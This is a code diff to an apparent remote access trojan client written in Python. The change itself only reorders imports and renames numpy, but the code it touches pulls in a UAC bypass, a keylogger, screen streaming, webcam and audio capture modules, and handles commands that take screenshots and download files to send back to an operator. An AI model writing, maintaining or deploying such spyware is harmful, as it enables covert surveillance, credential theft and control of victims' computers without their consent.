@@ -1,27 +1,27 @@
-import socket
-import pickle
-import zlib
-import os
-import time
 import threading
 import platform
 import geocoder
 import requests
+import socket
+import pickle
+import numpy
+import zlib
+import time
 import cv2
-import numpy as np
-from PIL import ImageGrab
-from subprocess import Popen, PIPE
-from sys import exit
+import os
 
 
-from Specific.encrypt import Encryption
 from Specific.uac_bypass import Bypass, is_running_as_admin
-from Modules.Clients.stream import Stream
-from Modules.Clients.cam import Cam
-from Modules.Clients.audio import Audio
 from Modules.Clients.keylogger import Keylogger
+from Modules.Clients.stream import Stream
+from Specific.encrypt import Encryption
+from Modules.Clients.audio import Audio
 from Modules.Clients.talk import Talk
+from Modules.Clients.cam import Cam
+from subprocess import Popen, PIPE
 from Utilities.client import *
+from PIL import ImageGrab
+from sys import exit
 
 
 class Client:
@@ -106,7 +106,6 @@ class Client:
 								print(e)
 								self.send_message({'message': f'Something went wrong working with services.'})
 	
-
 						elif message[:8].lower() == 'download':
 							try:
 								args = message[9:]
@@ -133,7 +132,7 @@ class Client:
 						elif message.lower() == 'screenshot' or message.lower() == 'screenshot -s':
 							try:
 								img = ImageGrab.grab()
-								frame = np.array(img)
+								frame = numpy.array(img)
 								self.send_message({'message': f'Upload of screenshot complete!', 'screenshot': frame})
 							except:
 								self.send_message({'message': f'Upload of screenshot failed.'})
@@ -313,7 +312,6 @@ class Client:
 								result = 'Empty response.'
 							self.send_message({'message': result})
 
-						# Reset
 						Client.new_msg = True
 						Client.msg_len = 0
 						Client.full_msg = b''
